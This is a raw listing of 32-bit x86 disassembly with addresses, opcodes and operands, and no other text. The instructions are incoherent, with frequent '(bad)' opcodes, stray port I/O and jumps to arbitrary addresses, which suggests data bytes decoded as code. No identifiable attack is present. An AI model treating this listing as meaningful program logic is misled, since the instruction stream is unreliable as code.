  418f94:	sbb    ecx,DWORD PTR [ebx]
  418f96:	xor    al,0xeb
  418f98:	in     al,dx
  418f99:	add    BYTE PTR [esi+0xd],dh
  418f9c:	mov    ah,cl
  418f9e:	aad    0x98
  418fa0:	or     ecx,DWORD PTR [edi]
  418fa2:	xchg   DWORD PTR [ebx-0x44ef7d0d],ebp
  418fa8:	leave  
  418fa9:	xchg   BYTE PTR [eax+edx*4-0x6e],bl
  418fad:	fisttp WORD PTR [eax+0x34]
  418fb0:	aam    0x7b
  418fb2:	icebp  
  418fb3:	mov    dl,0x53
  418fb5:	and    ah,bl
  418fb7:	mov    edi,0xdc2cde68
  418fbc:	pop    es
  418fbd:	out    dx,eax
  418fbe:	lahf   
  418fbf:	mov    WORD PTR [ecx+0x3656e6c2],es
  418fc5:	push   ebp
  418fc6:	push   ss
  418fc7:	(bad)  
  418fc8:	lds    esi,FWORD PTR [ecx]
  418fca:	mov    dh,0x83
  418fcc:	bound  esp,QWORD PTR [ebx]
  418fce:	xchg   DWORD PTR [ebx],ebx
  418fd0:	jno    0x419034
  418fd2:	stc    
  418fd3:	fwait
  418fd4:	(bad)
  418fd8:	adc    ch,BYTE PTR [edi]
  418fda:	les    ebx,FWORD PTR [edi-0x61231fcb]
  418fe0:	xor    BYTE PTR [bx],ch
  418fe3:	loop   0x419047
  418fe5:	scas   eax,DWORD PTR es:[edi]
  418fe6:	jno    0x419031
  418fe8:	push   es
  418fe9:	mov    esp,DWORD PTR [ecx+0x2e]
  418fec:	imul   eax,DWORD PTR [edx-0x6e],0xffffff9e
  418ff0:	dec    esp
  418ff1:	push   edx
  418ff2:	and    eax,0x414ba958
  418ff7:	mov    al,ds:0x111bd06
  418ffc:	add    ch,bl
  418ffe:	dec    esp
  418fff:	pop    es
  419000:	out    dx,eax
  419001:	fwait
  419002:	out    0x6a,eax
  419004:	sub    ebp,DWORD PTR [ebx+0x138c79]
  41900a:	or     BYTE PTR [ebp+0x3678b744],cl
  419010:	aad    0xc7
  419012:	sbb    eax,DWORD PTR [edi]
  419014:	scas   eax,DWORD PTR es:[edi]
  419015:	push   es
  419016:	and    al,0x56
  419018:	rcl    dh,cl
  41901a:	fs call 0xf12e:0xa121424b
  419022:	sbb    al,0x6f
  419024:	mov    dl,0xe9
  419026:	mov    bl,BYTE PTR [ecx]
  419028:	fcmovu st,st(2)
  41902a:	outs   dx,BYTE PTR ds:[esi]
  41902b:	rcr    BYTE PTR [eax-0x28d596d7],cl
  419031:	into   
  419032:	pop    ebp
  419033:	jg     0x41900c
  419035:	jl     0x41902a
  419037:	(bad)  
  419038:	cmp    BYTE PTR [esi-0x22],bh
  41903b:	and    edi,ecx
  41903d:	xchg   ebp,eax
  41903e:	dec    esp
  41903f:	push   ecx
  419040:	or     al,0xa2
  419042:	fadd   QWORD PTR [edi-0x7d3d904a]
  419048:	push   cs
  419049:	mov    ebx,eax
  41904b:	sub    bl,BYTE PTR [ecx+0x275df841]
  419051:	imul   ebp,DWORD PTR [eax+0x32],0xee57f94
  419058:	call   0x2a3a8d18
  41905d:	loopne 0x41908f
  41905f:	dec    esi
  419060:	or     al,BYTE PTR [ebp+0x74]
  419063:	inc    edi
  419064:	push   esp
  419065:	ds scas al,BYTE PTR es:[edi]
  419067:	aas    
  419068:	(bad)  
  419069:	std    
  41906a:	lods   al,BYTE PTR ds:[esi]
  41906b:	scas   eax,DWORD PTR es:[edi]
  41906c:	(bad)  
  41906d:	mov    al,ds:0x5ea4880b
  419072:	adc    bh,BYTE PTR [ecx-0x6e]
  419075:	push   es
  419076:	shl    bh,cl
  419078:	outs   dx,BYTE PTR ds:[esi]
  419079:	sbb    cl,BYTE PTR [eax]
  41907b:	(bad)  
  41907c:	(bad)  
  41907d:	mov    dh,0x65
  41907f:	shl    ebx,cl
  419081:	das    
  419082:	cmp    al,0x1a
  419084:	loop   0x419085
  419086:	jg     0x4190eb
  419088:	leave  
  419089:	sub    edi,DWORD PTR [edi]
  41908b:	adc    esi,edi
  41908d:	lock sbb BYTE PTR [esi+0x696a92aa],bl
  419094:	in     al,0x39
  419096:	fimul  WORD PTR [ebp+0x36]
  419099:	inc    ebp
  41909a:	add    ebx,DWORD PTR [edx-0x1c390371]
  4190a0:	adc    esp,DWORD PTR [eax-0x700d77bf]
  4190a6:	mov    cs,WORD PTR es:[edx+0x14280479]
  4190ad:	mov    esp,0x682306b4
  4190b2:	sbb    al,0x33
  4190b4:	jp     0x4190dd
  4190b6:	and    BYTE PTR [edx],0x6d
  4190b9:	scas   eax,DWORD PTR es:[edi]
  4190ba:	pushf  
  4190bb:	mov    DWORD PTR [edx],ebx
  4190bd:	xor    DWORD PTR cs:[edx+esi*1-0x14],edi
  4190c2:	dec    eax
  4190c3:	sahf   
  4190c4:	dec    esp
  4190c5:	mov    ch,0xfa
  4190c7:	xor    eax,0x2f1c7805
  4190cc:	into   
  4190cd:	sahf   
  4190ce:	lods   eax,DWORD PTR ds:[esi]
  4190cf:	push   ebp
  4190d0:	adc    al,0xc7
  4190d2:	jmp    0x7632:0xccf5e814
  4190d9:	lods   al,BYTE PTR ds:[esi]
  4190da:	xor    dh,BYTE PTR [esi+ecx*1+0x55]
  4190de:	inc    esp
  4190df:	add    ebx,0x39
  4190e2:	jno    0x41912e
  4190e4:	mov    BYTE PTR [ebp+0x4b90ef53],bh
  4190ea:	and    BYTE PTR [esi+edx*4+0x5a],cl
  4190ee:	lahf   
  4190ef:	mov    edi,0xf52642e9
  4190f4:	adc    ah,BYTE PTR [ecx]
  4190f6:	dec    edi
  4190f7:	cmp    eax,ebp
  4190f9:	jg     0x4190e4
  4190fb:	inc    edi
  4190fc:	sub    DWORD PTR [edi+0x25],edi
  4190ff:	push   es
  419100:	shr    DWORD PTR [ecx],1
  419102:	dec    eax
  419103:	lods   al,BYTE PTR ds:[esi]
  419104:	out    dx,al
  419105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419106:	sbb    DWORD PTR ds:0x3046ac65,edx
  41910c:	(bad)  
  41910d:	neg    DWORD PTR [esi+0x13]
  419110:	fdivr  st(2),st
  419112:	sar    DWORD PTR [eax],cl
  419114:	pop    ecx
  419115:	pop    esp
  419116:	or     dl,BYTE PTR [edi]
  419118:	gs cdq 
  41911a:	popa   
  41911b:	mov    bh,0x71
  41911d:	mov    edx,0x3ab43f29
  419122:	pop    esp
  419123:	or     DWORD PTR [ebp+ebx*8+0x41],0x29
  419128:	gs test eax,0xef729f0e
  41912e:	mov    ecx,0xe355f52c
  419134:	daa    
  419135:	lahf   
  419136:	ins    BYTE PTR es:[edi],dx
  419137:	mov    ch,al
  419139:	stos   DWORD PTR es:[edi],eax
  41913a:	js     0x419153
  41913c:	or     ecx,DWORD PTR [eax-0x24]
  41913f:	or     DWORD PTR [esi],esi
  419141:	mov    ebx,0xc46a1448
  419146:	or     BYTE PTR [eax+0x58c3460d],cl
  41914c:	mov    ds:0x5420c006,eax
  419151:	popa   
  419152:	retf   0x6f0b
  419155:	lea    ebx,[edx-0x4f]
  419158:	loopne 0x4191ce
  41915a:	push   eax
  41915b:	out    dx,al
  41915c:	jno    0x4190f1
  41915e:	xchg   ebp,eax
  41915f:	scas   al,BYTE PTR es:[edi]
  419160:	pop    eax
  419161:	jge    0x41916b
  419163:	inc    BYTE PTR [eax+esi*2+0x71b1301f]
  41916a:	ds mov ebp,0xc3124366
  419170:	pop    ss
  419171:	jnp    0x41912a
  419173:	out    dx,al
  419174:	je     0x419138
  419176:	xor    ch,dl
  419178:	inc    ecx
  419179:	mov    ch,0x1e
  41917b:	jns    0x419136
  41917d:	imul   ecx,ebx,0x27da7d05
  419183:	rcl    DWORD PTR [edi+ecx*1-0x15],0x6
  419188:	inc    eax
  419189:	leave  
  41918a:	adc    al,0x7c
  41918c:	aad    0xff
  41918e:	test   al,0xfc
  419190:	cmp    DWORD PTR [esp+eiz*8-0x14151923],0xf9131390
  41919b:	or     ebp,ecx
  41919d:	pop    es
  41919e:	mov    dh,0xb4
  4191a0:	xchg   ecx,eax
  4191a1:	scas   eax,DWORD PTR es:[edi]
  4191a2:	aam    0x6f
  4191a4:	dec    eax
  4191a5:	cmp    DWORD PTR [bp+di-0x2],esp
  4191a9:	data16 sti 
  4191ab:	xchg   ebp,eax
  4191ad:	js     0x41914a
  4191af:	push   ss
  4191b0:	add    edi,esi
  4191b2:	imul   ebp,DWORD PTR [ecx],0x33c6bc31
  4191b8:	(bad)  
  4191b9:	pop    ds
  4191ba:	mov    ah,0x48
  4191bc:	fs ret 
  4191be:	mov    ebp,ss
  4191c0:	(bad)  
  4191c1:	nop
  4191c2:	sbb    ch,BYTE PTR [eax+0x5a]
  4191c5:	jge    0x419176
  4191c7:	sbb    BYTE PTR [edi+0x4bbd08f2],dh
  4191cd:	shl    BYTE PTR [ecx],1
  4191cf:	nop
  4191d0:	pushf  
  4191d1:	add    BYTE PTR [esi+0x2a],dh
  4191d4:	in     al,0x44
  4191d6:	in     al,0x5f
  4191d8:	jle    0x4191af
  4191da:	imul   ecx,DWORD PTR [edi+0x6d05eecc],0xffffffa3
  4191e1:	pusha  
  4191e2:	push   edx
  4191e3:	es shr dh,0xe7
  4191e7:	adc    BYTE PTR ds:0xeb664481,ch
  4191ed:	sub    al,ah
  4191ef:	loopne 0x4191ce
  4191f1:	ins    DWORD PTR es:[edi],dx
  4191f2:	mov    edi,0x13bebb54
  4191f7:	pop    esp
  4191f8:	or     ah,cl
  4191fa:	imul   ebx,DWORD PTR [esi+ebp*8-0x1c67dd3b],0x35181c1b
  419205:	leave  
  419206:	icebp  
  419207:	mov    DWORD PTR [esi-0x4393cb24],esi
  41920d:	jle    0x4191a4
  41920f:	inc    ebp
  419210:	or     al,0xe1
  419212:	pop    ebx
  419213:	out    dx,al
  419214:	adc    esp,DWORD PTR [bp+0x68ed]
  419219:	mov    WORD PTR [esi],?
  41921b:	mov    ds:0x1dbc4f45,al
  419220:	inc    ecx
  419221:	and    esp,DWORD PTR [ebx-0x24a7bb84]
  419227:	xor    DWORD PTR [edi],esp
  419229:	xchg   esi,eax
  41922a:	fimul  WORD PTR ds:0x7d86e577
  419230:	or     al,0x6c
  419232:	imul   DWORD PTR [edi]
  419234:	jecxz  0x41925f
  419236:	iret   
  419237:	add    bl,BYTE PTR [ecx]
  419239:	push   ss
  41923a:	paddusb mm2,QWORD PTR fs:[ebp+0x43]
  41923f:	gs inc esi
  419241:	push   ebx
  419242:	pop    ebp
  419243:	int    0xd
  419245:	pop    eax
  419246:	scas   eax,DWORD PTR es:[edi]
  419247:	push   esi
  419248:	add    bl,BYTE PTR [eax]
  41924a:	loopne 0x419288
  41924c:	dec    edx
  41924d:	jns    0x4191e1
  41924f:	scas   al,BYTE PTR es:[edi]
  419250:	loopne 0x41923b
  419252:	sub    DWORD PTR [ebx-0x2056c06b],edi
  419258:	sbb    ah,BYTE PTR [edi]
  41925a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41925b:	out    dx,eax
  41925c:	mov    eax,ds:0x61a3e80d
  419261:	(bad)  
  419263:	and    eax,0x667cd069
  419268:	cdq    
  419269:	ds aas 
  41926b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41926c:	mov    esi,0x65e555cc
  419271:	loope  0x419280
  419273:	sar    ch,cl
  419275:	test   eax,0x4cbd69ca
  41927a:	mov    ebp,ss
  41927c:	adc    bl,BYTE PTR [edx+esi*2]
  41927f:	gs mov bl,0x54
  419282:	jns    0x419232
  419284:	out    dx,al
  419285:	pop    esp
  419286:	retf   0x5b7a
  419289:	lea    ebp,[edx]
  41928b:	fidiv  WORD PTR [ebx-0x15]
  41928e:	adc    eax,0x48193312
  419293:	xchg   ebp,eax
  419294:	es scas eax,DWORD PTR es:[edi]
  419296:	mov    ebx,0x5b4c07ee
  41929b:	and    ch,BYTE PTR [esi+0x4a33ca45]
  4192a1:	mov    edi,0x1d4e6bd9
  4192a6:	dec    edi
  4192a7:	push   ds
  4192a8:	sbb    DWORD PTR [ecx+0x34cb7abe],eax
  4192ae:	or     al,0xb9
  4192b1:	xchg   esi,eax
  4192b2:	rol    esp,cl
  4192b4:	mov    ds,edi
  4192b6:	mov    ebp,0x3ac18b9b
  4192bb:	mov    ds:0x51a36617,al
  4192c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192c1:	test   ah,ch
  4192c3:	js     0x419331
  4192c5:	sbb    ebp,ecx
  4192c7:	push   ebx
  4192c8:	xor    al,0xb5
  4192ca:	adc    BYTE PTR [esi-0x3c357373],ch
  4192d0:	xor    ch,BYTE PTR [ebx-0x10cfcd35]
  4192d6:	js     0x419326
  4192d8:	shl    DWORD PTR [ecx+0x56],0x81
  4192dc:	push   edi
  4192dd:	leave  
  4192de:	loopne 0x4192f8
  4192e0:	mul    DWORD PTR [edx-0x1a]
  4192e3:	push   ecx
  4192e4:	out    dx,al
  4192e5:	sbb    BYTE PTR [esi],cl
  4192e7:	(bad)  
  4192e8:	lods   eax,DWORD PTR ds:[esi]
  4192e9:	jo     0x41933d
  4192eb:	inc    edi
  4192ec:	das    
  4192ed:	add    BYTE PTR [eax],al
  4192ef:	add    BYTE PTR [eax],al
  4192f1:	add    BYTE PTR [ebp+0xe],al
  4192f4:	retf   0xcb6c
  4192f7:	in     al,dx
  4192f8:	out    0x2f,eax
  4192fa:	dec    ecx
  4192fb:	add    eax,0xe56a5d81
  419300:	cmp    BYTE PTR [eax+0x10fdd],dl
  419306:	repz add al,0x0
  419309:	add    al,cl
  41930b:	and    DWORD PTR [ecx+0x1b],eax
  41930e:	pop    ecx
  41930f:	mov    bl,0xce
  419311:	push   ds
  419312:	xchg   ecx,eax
  419313:	sub    cl,BYTE PTR [edx+0x220144f1]
  419319:	dec    BYTE PTR [edi*4+0x510716ea]
  419320:	addr16 (bad) 
  419322:	fmul   QWORD PTR [edi]
  419324:	jl     0x419320
  419326:	sub    eax,0x90480dea
  41932b:	xor    edx,DWORD PTR [ecx]
  41932d:	nop
  41932e:	js     0x4192b5
  419330:	int    0x20
  419332:	and    al,BYTE PTR [ebp+0x2e]
  419335:	dec    eax
  419336:	cmp    BYTE PTR [edi],al
  419338:	icebp  
  419339:	ins    DWORD PTR es:[edi],dx
  41933a:	popf   
  41933b:	retf   
  41933c:	adc    DWORD PTR [eax+ebp*4-0x1b64a6a1],eax
  419343:	sub    dh,0xd8
  419346:	gs xchg esi,eax
  419348:	mov    ebx,0x7c33417a
  41934d:	mov    ds:0x342bd5f2,al
  419352:	cmp    bl,BYTE PTR [ebp-0xbba5866]
  419358:	cli    
  419359:	scas   al,BYTE PTR es:[edi]
  41935a:	sub    al,0x74
  41935c:	sbb    eax,0x31ca84a3
  419361:	xor    eax,0xd82e1682
  419366:	or     DWORD PTR [esi+0x41],ecx
  419369:	daa    
  41936a:	push   esi
  41936b:	hlt    
  41936c:	cmc    
  41936d:	jnp    0x4193d9
  41936f:	jno    0x4193ad
  419371:	ds dec esp
  419373:	addr16 xchg ecx,eax
  419375:	into   
  419376:	cmp    ebx,esp
  419378:	push   ds
  419379:	cs push ecx
  41937b:	adc    edx,DWORD PTR ds:0x25506de5
  419381:	and    eax,0x2a08f66e
  419386:	sub    BYTE PTR [esi-0x133b96b8],dl
  41938c:	ja     0x41932f
  41938e:	xchg   edi,eax
  41938f:	lods   al,BYTE PTR ds:[esi]
  419390:	mov    al,0xc5
  419392:	cwde   
  419393:	xlat   BYTE PTR ds:[ebx]
  419394:	sub    al,BYTE PTR [esp+ebp*4+0x48]
  419398:	xchg   edx,eax
  419399:	pop    edx
  41939a:	cmp    DWORD PTR [ecx-0x2f],esi
  41939d:	scas   eax,DWORD PTR es:[edi]
  41939e:	jecxz  0x4193bf
  4193a0:	repnz add DWORD PTR [edi-0x13],edx
  4193a4:	cmp    eax,0x87b1d607
  4193a9:	xchg   DWORD PTR [ebp+0x11],edx
  4193ac:	sbb    bh,0x36
  4193af:	jmp    0x41936b
  4193b1:	push   eax
  4193b2:	fldcw  WORD PTR [eax*8-0x5db6cf43]
  4193b9:	and    BYTE PTR [ebx+0x38b86974],dh
  4193bf:	mov    esi,0x828e8017
  4193c4:	leave  
  4193c5:	xor    eax,0xef8fa05d
  4193ca:	dec    ebx
  4193cb:	mov    ebx,0x40252299
  4193d0:	add    ch,BYTE PTR [ebx+0x73]
  4193d3:	mov    cl,0x7b
  4193d5:	clc    
  4193d6:	mov    WORD PTR [eax-0x771f4738],gs
  4193dc:	xor    dh,BYTE PTR [edi]
  4193de:	std    
  4193df:	or     al,0xe5
  4193e1:	aas    
  4193e2:	(bad)  
  4193e3:	mov    DWORD PTR [ebx+0x640aaf51],edi
  4193e9:	mov    dl,0x80
  4193eb:	aaa    
  4193ec:	aas    
  4193ed:	dec    esp
  4193ee:	sub    BYTE PTR [ebp-0x4eb2b587],0x50
  4193f5:	and    ah,BYTE PTR [ebp-0x7ce7eaee]
  4193fb:	dec    ebx
  4193fc:	clc    
  4193fd:	mov    WORD PTR [ecx],ds
  4193ff:	jns    0x419420
  419401:	out    0x97,al
  419403:	xchg   esp,esp
  419405:	shr    BYTE PTR [edi],cl
  419407:	pop    eax
  419408:	add    edx,DWORD PTR [ebx-0xe]
  41940b:	xor    al,ah
  41940d:	pop    edx
  41940e:	cdq    
  41940f:	mov    ds:0x71caa9c3,eax
  419414:	lods   al,BYTE PTR ds:[esi]
  419415:	mov    ds:0xfd384482,al
  41941a:	cmp    BYTE PTR ds:0x9675c49,0xf2
  419421:	test   eax,0x61a77182
  419426:	pusha  
  419427:	addr16 test eax,0x1567a159
  41942d:	push   esi
  41942e:	pusha  
  41942f:	shl    BYTE PTR [ebx+0x5610f7f],0x1e
  419436:	xchg   edx,eax
  419437:	ins    DWORD PTR es:[edi],dx
  419438:	scas   al,BYTE PTR es:[edi]
  419439:	xchg   ebx,eax
  41943a:	push   es
  41943b:	or     eax,0x4f4584e7
  419440:	icebp  
  419441:	repz sub esp,eax
  419444:	adc    esp,DWORD PTR ds:0xaa1e45ac
  41944a:	aaa    
  41944b:	jbe    0x4193e9
  41944d:	aas    
  41944e:	push   ecx
  41944f:	sub    al,0xa9
  419451:	jno    0x4194c6
  419453:	fwait
  419454:	mov    dh,0x1b
  419456:	data16 jo 0x41945a
  419459:	push   ss
  41945a:	scas   eax,DWORD PTR es:[edi]
  41945b:	(bad)  
  41945c:	adc    dl,BYTE PTR [eax-0x350ec7c6]
  419462:	iret   
  419463:	xor    DWORD PTR [ecx+eax*8+0x3f],edx
  419467:	mov    bh,0x8d
  419469:	in     eax,dx
  41946a:	or     eax,0x4bfc88fd
  41946f:	mov    ah,BYTE PTR [edx-0x6d5bd4a8]
  419475:	loop   0x4194ea
  419477:	xchg   ebp,eax
  419478:	push   ds
  419479:	ins    BYTE PTR es:[edi],dx
  41947a:	mov    cl,bh
  41947c:	cmp    al,0xc3
  41947e:	jno    0x419413
  419480:	jmp    FWORD PTR [edx-0x6ff80bba]
  419486:	or     eax,0x219ec73a
  41948b:	jno    0x4194f8
  41948d:	mov    es,WORD PTR [eax]
  41948f:	xlat   BYTE PTR ds:[ebx]
  419490:	inc    esi
  419491:	out    dx,al
  419492:	pop    DWORD PTR [ecx+0xa]
  419495:	mov    cl,0x7e
  419497:	xor    DWORD PTR [esi+0x5],0x8773002b
  41949e:	or     esi,ebp
  4194a0:	mov    bh,0x84
  4194a2:	hlt    
  4194a3:	scas   al,BYTE PTR es:[edi]
  4194a4:	xor    DWORD PTR [ecx-0x17],esi
  4194a7:	mov    ds:0xe16c1133,eax
  4194ac:	das    
  4194ad:	in     eax,0xdb
  4194af:	sbb    BYTE PTR [edi],ah
  4194b1:	sbb    al,0x2b
  4194b3:	repz xchg ebx,eax
  4194b5:	scas   eax,DWORD PTR es:[edi]
  4194b6:	and    ch,BYTE PTR [ecx+eiz*4-0x49e0b346]
  4194bd:	(bad)  
  4194be:	jno    0x4194ba
  4194c0:	aad    0x6b
  4194c2:	scas   eax,DWORD PTR es:[edi]
  4194c3:	add    BYTE PTR ds:0x2091abef,0x7
  4194ca:	sbb    dh,BYTE PTR [esi]
  4194cc:	jecxz  0x4194d4
  4194ce:	int    0xda
  4194d0:	push   ds
  4194d1:	pop    ecx
  4194d2:	xor    DWORD PTR [eax+0x71],ebp
  4194d5:	test   eax,0xe708e868
  4194da:	mov    bl,BYTE PTR [edi-0x76038e04]
  4194e0:	in     eax,0x86
  4194e2:	data16 sbb bh,ah
  4194e5:	dec    edx
  4194e6:	imul   esp,DWORD PTR [esi+0x49772bd7],0xffffffa5
  4194ed:	sub    esi,DWORD PTR [ebp+0x70a6c0f3]
  4194f3:	std    
  4194f4:	int    0x83
  4194f6:	mov    edx,0x23369a0f
  4194fb:	push   0xb0880210
  419500:	repz jno 0x4194d4
  419503:	mov    edi,0x5123c775
  419508:	add    ch,BYTE PTR [ecx-0x3b]
  41950b:	mov    bh,BYTE PTR [edi+0xd2d0c3e]
  419511:	nop    ebp
  419514:	in     al,dx
  419515:	sbb    esp,DWORD PTR [edx]
  419517:	add    al,0x39
  419519:	xchg   DWORD PTR [eax],ecx
  41951b:	inc    esi
  41951c:	aam    0xe5
  41951e:	or     BYTE PTR [eax+0x57859a70],dh
  419524:	ret    
  419525:	cmp    al,0x3c
  419527:	dec    esp
  419528:	(bad)  
  419529:	outs   dx,DWORD PTR ds:[esi]
  41952a:	mov    esi,0x831ee93f
  41952f:	out    0x96,eax
  419531:	scas   al,BYTE PTR es:[edi]
  419532:	retf   0x57a0
  419535:	in     al,0xdb
  419537:	dec    esp
  419538:	or     al,0xe6
  41953a:	jne    0x4195ae
  41953c:	mov    cl,0xba
  41953e:	inc    edi
  41953f:	in     al,dx
  419540:	cmp    BYTE PTR [ecx-0x70206f7a],ah
  419546:	dec    edi
  419547:	lahf   
  419548:	and    BYTE PTR [eax-0x76],al
  41954b:	(bad)  
  41954d:	inc    edx
  41954e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41954f:	(bad)  
  419550:	sti    
  419551:	jp     0x41957d
  419553:	ret    
  419554:	test   DWORD PTR [ebx-0x685ed7c4],esp
  41955a:	mov    esp,0xe2397f8d
  41955f:	push   edi
  419560:	lock leave 
  419562:	cmp    eax,0xf8da7a1f
  419567:	in     al,dx
  419568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419569:	mov    esi,0x87dd931a
  41956e:	dec    ebx
  41956f:	add    esi,DWORD PTR [ecx+ecx*1+0x4059b456]
  419576:	in     eax,dx
  419577:	jecxz  0x41953b
  419579:	mov    edi,0xbfed0ac7
  41957e:	pop    eax
  41957f:	loopne 0x419538
  419581:	cmp    bl,ch
  419583:	mov    al,0x6
  419585:	repz aad 0x60
  419588:	and    BYTE PTR [ebx],dl
  41958a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41958b:	push   esp
  41958c:	or     edi,DWORD PTR [edx]
  41958e:	dec    ebp
  41958f:	mov    ebx,DWORD PTR [esi+eiz*2+0x7]
  419593:	enter  0x9c05,0x26
  419597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419598:	mov    edi,0x9a2cd4ec
  41959d:	lea    eax,[edi-0x2f]
  4195a0:	or     edx,DWORD PTR [ebp+0x1b]
  4195a3:	setb   BYTE PTR [ecx]
  4195a6:	mov    ch,0x5d
  4195a8:	out    0x11,al
  4195aa:	xor    eax,0x43bcf1d3
  4195af:	push   cs
  4195b0:	cwde   
  4195b1:	push   0xffffffb9
  4195b3:	and    edi,DWORD PTR [esi-0x459d7275]
  4195b9:	xchg   edi,eax
  4195ba:	test   eax,0xa0f21be3
  4195bf:	push   edi
  4195c0:	nop
  4195c1:	das    
  4195c2:	push   ebx
  4195c3:	push   cs
  4195c4:	and    DWORD PTR [ecx],0x882f3f02
  4195ca:	jnp    0x41959c
  4195cc:	cmp    BYTE PTR cs:[edi+0x7],bl
  4195d0:	and    esp,0xf00a4d26
  4195d6:	adc    eax,0x73ef5adc
  4195db:	or     edi,ebp
  4195dd:	(bad)  
  4195de:	cdq    
  4195df:	mov    dh,0x58
  4195e1:	js     0x419639
  4195e3:	or     eax,0x78b6b9c1
  4195e8:	pop    ss
  4195e9:	lahf   
  4195ea:	mov    WORD PTR [ebx+0x67],es
  4195ed:	mov    cl,0x8
  4195ef:	shr    BYTE PTR [ebx+0x6e540bb],cl
  4195f5:	mov    WORD PTR [edi-0x4fe39b50],es
  4195fb:	lods   al,BYTE PTR ds:[esi]
  4195fc:	xchg   DWORD PTR [ecx-0x2c110d1f],esi
  419602:	inc    esp
  419603:	jo     0x419610
  419605:	sub    ah,dl
  419607:	cmc    
  419608:	bound  edx,QWORD PTR [ebp-0x58e4fbf9]
  41960e:	jl     0x4195cf
  419610:	pop    ss
  419611:	xchg   al,bl
  419613:	fistp  DWORD PTR ds:0xccaccf43
  419619:	add    al,0x82
  41961b:	xor    BYTE PTR [edi+0x7d],bl
  41961e:	xor    DWORD PTR [eax+0x7ad3d766],0xabe2cdc3
  419628:	cli    
  419629:	xor    eax,edi
  41962b:	fdiv   DWORD PTR [ecx]
  41962d:	and    BYTE PTR [ebp-0x551e833d],bl
  419633:	xor    BYTE PTR [ebx-0x36],dl
  419636:	retf   0xe29c
  419639:	ja     0x41969e
  41963b:	nop
  41963c:	add    edi,0x2d2caa34
  419642:	push   eax
  419643:	xor    ah,BYTE PTR [ebp-0x7f2cdbb5]
  419649:	jo     0x41965d
  41964b:	lds    esp,FWORD PTR [eax+eiz*4]
  41964e:	push   eax
  41964f:	sbb    al,0x6a
  419651:	add    al,0x47
  419653:	mov    al,0x8d
  419655:	nop
  419656:	popa   
  419657:	stc    
  419658:	xor    BYTE PTR [ecx],ch
  41965a:	(bad)  
  41965b:	retf   
  41965c:	inc    esi
  41965d:	ret    
  41965e:	mov    edx,0xa4b45052
  419663:	aad    0xc1
  419665:	rol    BYTE PTR [esi+ebp*2],1
  419668:	mov    esp,0x73366bfe
  41966d:	outs   dx,BYTE PTR ds:[esi]
  41966e:	sbb    BYTE PTR [esi],bl
  419670:	or     ebx,eax
  419672:	fcom   QWORD PTR [eax-0x4b6428b9]
  419678:	repz sub al,0xce
  41967b:	add    eax,0x3ace414b
  419680:	dec    esi
  419681:	test   DWORD PTR [esi+0x1f],ebx
  419684:	dec    edx
  419685:	push   esi
  419686:	mov    al,0xef
  419688:	add    DWORD PTR [eax-0x27b4dfbb],esp
  41968e:	lods   eax,DWORD PTR ds:[esi]
  41968f:	call   0x62bd48f5
  419694:	pushf  
  419695:	mov    cl,0x90
  419697:	leave  
  419698:	xchg   esi,ebx
  41969a:	or     al,0x59
  41969c:	fbstp  TBYTE PTR [edx-0x5a2bbb6a]
  4196a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196a3:	mov    bl,BYTE PTR [ebp+0x5e3f0c59]
  4196a9:	cmp    BYTE PTR [ecx],al
  4196ab:	mov    bh,0x4
  4196ad:	and    edi,ebx
  4196af:	inc    BYTE PTR [eax]
  4196b1:	mov    dh,0xe
  4196b3:	pop    edx
  4196b4:	mov    ecx,0xd2c2a11b
  4196b9:	outs   dx,DWORD PTR ds:[esi]
  4196ba:	pop    ds
  4196bb:	in     eax,dx
  4196bc:	push   eax
  4196bd:	addr16 cs pusha 
  4196c0:	push   edx
  4196c1:	fwait
  4196c2:	adc    al,0x78
  4196c4:	jae    0x419721
  4196c6:	pop    ss
  4196c7:	or     eax,0xe2943faa
  4196cc:	cmp    eax,DWORD PTR [esi-0x2690cd9b]
  4196d2:	(bad)  
  4196d3:	leave  
  4196d4:	sahf   
  4196d5:	dec    eax
  4196d6:	daa    
  4196d7:	loop   0x41969d
  4196d9:	aam    0x54
  4196db:	ficomp DWORD PTR [ebx+0x33]
  4196de:	js     0x4196e4
  4196e0:	leave  
  4196e1:	dec    ebx
  4196e2:	aam    0xda
  4196e4:	fsubr  QWORD PTR [ecx-0x64]
  4196e7:	mov    ds:0x7c0930c3,eax
  4196ec:	pop    ebx
  4196ed:	adc    eax,0xc9ce115f
  4196f2:	mov    ch,0x15
  4196f4:	xlat   BYTE PTR ds:[ebx]
  4196f5:	test   DWORD PTR [esi+0x75],eax
  4196f8:	test   DWORD PTR [edi],edx
  4196fa:	je     0x419711
  4196fc:	mov    esp,ebp
  4196fe:	and    BYTE PTR [ebp+0x6b],ah
  419701:	inc    DWORD PTR [eax-0x58]
  419704:	int3   
  419705:	aad    0x29
  419707:	xor    BYTE PTR ds:[edx],0xc2
  41970b:	call   0xe4e962c1
  419710:	or     al,0x17
  419712:	fsubr  QWORD PTR [edx-0x1]
  419715:	cmp    BYTE PTR [edi-0x3281112a],ah
  41971b:	mov    esp,ecx
  41971d:	xor    BYTE PTR [esi+0x27],dl
  419720:	aam    0xa9
  419722:	mov    cl,BYTE PTR [ecx]
  419724:	rcr    dh,0x4c
  419727:	cmp    eax,0xbf45a335
  41972c:	mov    ebp,0xfdce9ea7
  419731:	addr16 ret 0x6c42
  419735:	mov    ah,BYTE PTR [ecx+0x12a6626d]
  41973b:	xor    eax,0x81cd9463
  419740:	retf   
  419741:	(bad)  
  419742:	in     al,dx
  419743:	cmp    DWORD PTR [ecx-0x3226f969],esi
  419749:	mov    esi,0x1665dbbc
  41974e:	adc    dl,BYTE PTR [ebp+eiz*4+0x37]
  419752:	pop    esi
  419753:	pop    edx
  419754:	mov    fs,WORD PTR [esi-0x56]
  419757:	mov    al,ds:0xaed4c20e
  41975c:	add    al,0xfc
  41975e:	out    0x7f,al
  419760:	inc    ebp
  419761:	adc    al,0xc0
  419763:	cmp    bh,BYTE PTR [ecx]
  419765:	and    ah,ch
  419767:	and    edi,edi
  419769:	cmp    eax,0x1ce16f6e
